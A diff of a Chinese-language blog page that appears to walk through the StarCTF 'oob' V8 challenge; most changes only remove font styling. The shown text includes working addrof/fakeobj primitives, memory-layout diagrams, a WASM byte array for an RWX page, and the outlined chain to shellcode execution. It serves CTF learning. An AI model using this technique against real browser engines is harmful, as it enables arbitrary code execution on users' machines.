@@ -72,7 +72,7 @@
 <meta property="og:image" content="https://ghostshark-pro.github.io/images/starctf-oob/1789643464665-c459fad1-34f7-4657-a2e2-4c74e9bbecf3.png">
 <meta property="og:image" content="https://ghostshark-pro.github.io/images/starctf-oob/1789214149702-ee4742d0-bae9-4e56-8b4a-72b9f7bddf08.jpeg">
 <meta property="article:published_time" content="2026-09-17T11:18:37.000Z">
-<meta property="article:modified_time" content="2026-10-05T22:46:23.692Z">
+<meta property="article:modified_time" content="2026-10-06T10:10:17.512Z">
 <meta property="article:author" content="shark">
 <meta property="article:tag" content="V8">
 <meta property="article:tag" content="starctf oob">
@@ -501,12 +501,12 @@
 <!-- 这是一张图片，ocr 内容为： -->
 <p><img src="/images/starctf-oob/1788945067442-93341d76-9924-4ccc-8f90-eb9298a6b41e.png" srcset="/img/loading.gif" lazyload></p>
 <p>如果题目给了commit，可以在gclient sync之前</p>
-<p><font style="color:rgb(36, 41, 46);">git reset –hard 5a2307d0f2c5b650c6858e2b9b57b335a59946ff（这个会把修改切没掉，只切版本的话就用git checkout）</font></p>
-<p><font style="color:rgb(36, 41, 46);">推荐用gclient sync -D，可以把不需要的依赖删掉</font></p>
+<p>git reset –hard 5a2307d0f2c5b650c6858e2b9b57b335a59946ff（这个会把修改切没掉，只切版本的话就用git checkout）</p>
+<p>推荐用gclient sync -D，可以把不需要的依赖删掉</p>
 <!-- 这是一张图片，ocr 内容为： -->
 <p><img src="/images/starctf-oob/1788945515139-5a4ef050-b8e7-4634-8605-ab056834768c.png" srcset="/img/loading.gif" lazyload></p>
-<p><font style="color:rgb(36, 41, 46);">如果题目提供了patch就在gclient sync -D后打一下</font><font style="color:rgb(36, 41, 46);">git apply &lt; .&#x2F;patch</font></p>
-<h2 id="自动编译"><a href="#自动编译" class="headerlink" title="自动编译"></a><font style="color:rgb(36, 41, 46);">自动编译</font></h2><p>原文出于方便编译任意版本的目的写了build.sh，不过对于初学者来说还是先手搓好</p>
+<p>如果题目提供了patch就在gclient sync -D后打一下git apply &lt; .&#x2F;patch</p>
+<h2 id="自动编译"><a href="#自动编译" class="headerlink" title="自动编译"></a>自动编译</h2><p>原文出于方便编译任意版本的目的写了build.sh，不过对于初学者来说还是先手搓好</p>
 <p>这部分属于额外环境封装，跳过</p>
 <h1 id="通用利用链"><a href="#通用利用链" class="headerlink" title="通用利用链"></a>通用利用链</h1><p>在正常做ctf时一般都有一个明确的目标，拿shell或者orw，原文认为在v8中的目标就是执行任意shellcode</p>
 <h2 id="v8调试"><a href="#v8调试" class="headerlink" title="v8调试"></a>v8调试</h2><p>首先把v8&#x2F;tools&#x2F;gdbinit加入到~&#x2F;.gdbinit中</p>
@@ -639,29 +639,29 @@
 <p>这就是addrof函数的目的</p>
 <h2 id="double-to-object"><a href="#double-to-object" class="headerlink" title="double to object"></a>double to object</h2><p>fakeobj:把浮点数组伪装成对象数组</p>
 <h2 id="利用模板概览"><a href="#利用模板概览" class="headerlink" title="利用模板概览"></a>利用模板概览</h2><p><strong>漏洞本身只负责一件事：改写某个 JSArray 的 map 字段</strong></p>
-<p><font style="color:rgb(36, 41, 46);background-color:rgba(0, 0, 0, 0);">具体漏洞(OOB &#x2F; UAF &#x2F; 类型混淆)唯一要求:能把某个 JSArray 的 map 改成另一种数组的 map</font></p>
+<p>具体漏洞(OOB &#x2F; UAF &#x2F; 类型混淆)唯一要求:能把某个 JSArray 的 map 改成另一种数组的 map</p>
 <table>
 <thead>
 <tr>
 <th></th>
-<th><font style="color:rgb(36, 41, 46);background-color:rgba(0, 0, 0, 0);">对象数组 (PACKED_ELEMENTS)</font></th>
-<th><font style="color:rgb(36, 41, 46);background-color:rgba(0, 0, 0, 0);">double 数组 (PACKED_DOUBLE_ELEMENTS)</font></th>
+<th>对象数组 (PACKED_ELEMENTS)</th>
+<th>double 数组 (PACKED_DOUBLE_ELEMENTS)</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><font style="color:rgb(36, 41, 46);background-color:rgba(0, 0, 0, 0);">元素在内存中的形态</font></td>
-<td><font style="color:rgb(36, 41, 46);background-color:rgba(0, 0, 0, 0);">32 位压缩指针(最低位 tag&#x3D;1)</font></td>
-<td><font style="color:rgb(36, 41, 46);background-color:rgba(0, 0, 0, 0);">64 位原始值，无任何 tag</font></td>
+<td>元素在内存中的形态</td>
+<td>32 位压缩指针(最低位 tag&#x3D;1)</td>
+<td>64 位原始值，无任何 tag</td>
 </tr>
 <tr>
-<td><font style="color:rgb(36, 41, 46);background-color:rgba(0, 0, 0, 0);">读 arr[0] 时引擎做什么</font></td>
-<td><font style="color:rgb(36, 41, 46);background-color:rgba(0, 0, 0, 0);">解引用：当指针解析，返回一个对象句柄</font></td>
-<td><font style="color:rgb(36, 41, 46);background-color:rgba(0, 0, 0, 0);">原样返回这 8 个字节，不解释、不追踪</font></td>
+<td>读 arr[0] 时引擎做什么</td>
+<td>解引用：当指针解析，返回一个对象句柄</td>
+<td>原样返回这 8 个字节，不解释、不追踪</td>
 </tr>
 <tr>
-<td><font style="color:rgb(36, 41, 46);background-color:rgba(0, 0, 0, 0);">GC 怎么对待内容</font></td>
-<td><font style="color:rgb(36, 41, 46);background-color:rgba(0, 0, 0, 0);">逐个扫描、按对象移动更新</font></td>
-<td><font style="color:rgb(36, 41, 46);background-color:rgba(0, 0, 0, 0);">完全不理会，GC 不会扫 FixedDoubleArray 的内容</font></td>
+<td>GC 怎么对待内容</td>
+<td>逐个扫描、按对象移动更新</td>
+<td>完全不理会，GC 不会扫 FixedDoubleArray 的内容</td>
 </tr>
 </tbody></table>
 <p>之后的利用链全部固定：map 混淆 → <code>addrof</code>&#x2F;<code>fakeObj</code> 原语 → 任意读写 → 劫持 <code>backing_store</code> → 写 WASM RWX 页 → 触发执行</p>
@@ -748,7 +748,7 @@
 <!-- 这是一张图片，ocr 内容为： -->
 <p><img src="/images/starctf-oob/1789316186069-120b945b-305b-4500-9ad3-073c8127e35e.png" srcset="/img/loading.gif" lazyload></p>
 <p>给所有 JavaScript 数组的原型 <code>Array.prototype</code> 新增了一个叫 <code>oob</code> （out of bounds）的方法，传入两个参数</p>
-<p><font style="color:rgb(15, 17, 21);">也就是 JS 里能这么调</font></p>
+<p>也就是 JS 里能这么调</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">let a = [1.1, 2.2, 3.3];<br>a.oob();        // 读<br>a.oob(1.337);   // 写<br></code></pre></td></tr></table></figure>
 
 <!-- 这是一张图片，ocr 内容为： -->
@@ -790,8 +790,8 @@
 <p>itof用u32拆开val，&amp; 0xffffffffn 表示位与，低32位保留，高位清0；高位右移</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">val            = <span class="hljs-variable constant_">HHHHHHHH</span> <span class="hljs-variable constant_">LLLLLLLL</span><br>val &amp; <span class="hljs-number">0xffffffffn</span> → <span class="hljs-number">00000000</span> <span class="hljs-variable constant_">LLLLLLLL</span>   ← 低 <span class="hljs-number">32</span> 位<br>val &gt;&gt; <span class="hljs-number">32n</span>        → <span class="hljs-number">00000000</span> <span class="hljs-variable constant_">HHHHHHHH</span>   ← 高 <span class="hljs-number">32</span> 位搬到低位<br><span class="hljs-comment">//大概长这样，高低位分别运算并存储</span><br></code></pre></td></tr></table></figure>
 
-<p><em><font style="color:#DF2A3F;">00000000 LLLLLLLL</font></em></p>
-<p><em><font style="color:#DF2A3F;">00000000 HHHHHHHH</font></em></p>
+<p><em>00000000 LLLLLLLL</em></p>
+<p><em>00000000 HHHHHHHH</em></p>
 <p>注意这是显示形式，u32储存的是32位数据（JS中普通数字都是 <code>Number</code>，&gt;&gt;这类位运算会先把number<strong>转换成 32 位整数</strong>再进行操作  ），两个加起来正好是64位 </p>
 <h3 id="addrof-fakeobj"><a href="#addrof-fakeobj" class="headerlink" title="addrof()&#x2F;fakeobj()"></a>addrof()&#x2F;fakeobj()</h3><p>addrof()把obj数组的map改成浮点数的map,fakeobj()相反</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> obj = &#123;<span class="hljs-string">&quot;A&quot;</span>: <span class="hljs-number">1</span>&#125;;<br><span class="hljs-keyword">var</span> obj_arr = [obj];<br><span class="hljs-keyword">var</span> float_arr = [<span class="hljs-number">1.1</span>,<span class="hljs-number">1.2</span>,<span class="hljs-number">1.3</span>,<span class="hljs-number">1.4</span>];<br><br><span class="hljs-keyword">var</span> obj_arr_map = obj_arr.<span class="hljs-title function_">oob</span>();<br><span class="hljs-keyword">var</span> float_arr_map = float_arr.<span class="hljs-title function_">oob</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">in_obj</span>)&#123;<br>  obj_arr[<span class="hljs-number">0</span>] = in_obj;<br>  obj_arr.<span class="hljs-title function_">oob</span>(float_arr_map);<br>  <span class="hljs-keyword">let</span> addr = obj_arr[<span class="hljs-number">0</span>];<br>  obj_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">ftoi</span>(addr);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeobj</span>(<span class="hljs-params">addr</span>)&#123;<br>  float_arr[<span class="hljs-number">0</span>] = <span class="hljs-title function_">itof</span>(addr);<br>  float_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br>  <span class="hljs-keyword">let</span> fake = float_arr[<span class="hljs-number">0</span>];<br>  float_arr.<span class="hljs-title function_">oob</span>(float_arr_map);<br>  <span class="hljs-keyword">return</span> fake;<br>&#125;<br></code></pre></td></tr></table></figure>
@@ -828,7 +828,7 @@
 <p>JSArray的布局大致如此</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">JSArray</span><br>┌─────────────────────┐<br>│ map                 │  告诉是什么类型<br>├─────────────────────┤<br>│ properties          │<br>├─────────────────────┤<br>│ elements            │ ────────&gt; 真正存数组元素的地方<br>├─────────────────────┤<br>│ length              │<br>└─────────────────────┘<br></code></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(15, 17, 21);">JSArray 本身只有 4 个字段（0x20 字节），元素放在堆上另一块连续内存里（这种设计便于共享内存以及copy on write）</font></p>
+<p>JSArray 本身只有 4 个字段（0x20 字节），元素放在堆上另一块连续内存里（这种设计便于共享内存以及copy on write）</p>
 <p>即elements指向某块内存，fake[0]是去 elements 指向的+0x10处读取第 0 个元素</p>
 <p>arb_rw_arr的内存布局变化</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript">真实 arb_rw_arr 的 <span class="hljs-title class_">FixedDoubleArray</span><br>┌──────────────────────────────┐<br>│ E+<span class="hljs-number">0x00</span>: <span class="hljs-title class_">FixedDoubleArray</span>.<span class="hljs-property">map</span>  │<br>│ E+<span class="hljs-number">0x08</span>: length                │<br>│ E+<span class="hljs-number">0x10</span>: elements[<span class="hljs-number">0</span>]           │ = float_arr_map  ──&gt; 被当成 fake.<span class="hljs-property">map</span><br>│ E+<span class="hljs-number">0x18</span>: elements[<span class="hljs-number">1</span>]           │ = <span class="hljs-number">1.2</span>            ──&gt; 被当成 fake.<span class="hljs-property">properties</span><br>│ E+<span class="hljs-number">0x20</span>: elements[<span class="hljs-number">2</span>]           │ = <span class="hljs-number">1.3</span>            ──&gt; 被当成 fake.<span class="hljs-property">elements</span><br>│ E+<span class="hljs-number">0x28</span>: elements[<span class="hljs-number">3</span>]           │ = <span class="hljs-number">1.4</span>            ──&gt; 被当成 fake.<span class="hljs-property">length</span><br>└──────────────────────────────┘<br>          ↑<br>          │ fake = <span class="hljs-title function_">fakeobj</span>(A - <span class="hljs-number">0x20</span>) = <span class="hljs-title function_">fakeobj</span>(E + <span class="hljs-number">0x10</span>)<br>          │<br><br>改 arb_rw_arr[<span class="hljs-number">2</span>]：<br>E+<span class="hljs-number">0x20</span> = addr - <span class="hljs-number">0x10</span><br>        ↓<br>fake.<span class="hljs-property">elements</span> = addr - <span class="hljs-number">0x10</span><br>        ↓<br>fake[<span class="hljs-number">0</span>] 实际访问：<br>fake.<span class="hljs-property">elements</span> + <span class="hljs-number">0x10</span> = addr<br>        ↓<br>读/写 addr<br></code></pre></td></tr></table></figure>
@@ -837,8 +837,8 @@
 <p>内存布局长这样</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">E+<span class="hljs-number">0x00</span>  ┃ <span class="hljs-title class_">FixedDoubleArray</span> 的 map        ┃ ┐<br>E+<span class="hljs-number">0x08</span>  ┃ length = <span class="hljs-number">4</span>                      ┃ ┘ buffer 头，共 <span class="hljs-number">0x10</span><br>E+<span class="hljs-number">0x10</span>  ┃ element[<span class="hljs-number">0</span>] = float_arr_map     ┃ ← fake 必须从这一行开始<br>E+<span class="hljs-number">0x18</span>  ┃ element[<span class="hljs-number">1</span>] = <span class="hljs-number">1.2</span>               ┃<br>E+<span class="hljs-number">0x20</span>  ┃ element[<span class="hljs-number">2</span>] = <span class="hljs-number">1.3</span>               ┃  数据区，<span class="hljs-number">4</span> × <span class="hljs-number">8</span> = <span class="hljs-number">0x20</span><br>E+<span class="hljs-number">0x28</span>  ┃ element[<span class="hljs-number">3</span>] = <span class="hljs-number">1.4</span>               ┃<br>E+<span class="hljs-number">0x30</span>  ┃ ───────── buffer 结束 ─────────┃<br>A+<span class="hljs-number">0x00</span>  ┃ <span class="hljs-title class_">JSArray</span>.<span class="hljs-property">map</span>                     ┃ ← A = E + <span class="hljs-number">0x30</span><br>A+<span class="hljs-number">0x08</span>  ┃ properties                      ┃<br>A+<span class="hljs-number">0x10</span>  ┃ elements → E                    ┃<br>A+<span class="hljs-number">0x18</span>  ┃ length = <span class="hljs-number">4</span>                      ┃<br></code></pre></td></tr></table></figure>
 
-<p>等于是<code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(250, 250, 250);&quot;&gt;arb_rw_arr&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> 的元素区被借出来塞进fake对象</font></p>
-<h3 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a><font style="color:rgb(15, 17, 21);">WASM</font></h3><p>用wasm申请一个RWX页</p>
+<p>等于是<code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(250, 250, 250);&quot;&gt;arb_rw_arr&lt;/font&gt;</code> 的元素区被借出来塞进fake对象</p>
+<h3 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a>WASM</h3><p>用wasm申请一个RWX页</p>
 <p>这里可以用用wat2wasm、wasm2wat</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> wasm_code = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<br>  <span class="hljs-number">0</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">109</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">133</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">96</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">127</span>, <span class="hljs-number">3</span>,<br>  <span class="hljs-number">130</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">112</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">131</span>,<br>  <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">129</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">145</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>,<br>  <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">121</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">109</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>  <span class="hljs-number">10</span>, <span class="hljs-number">138</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">42</span>, <span class="hljs-number">11</span><br>]);<br></code></pre></td></tr></table></figure>
 
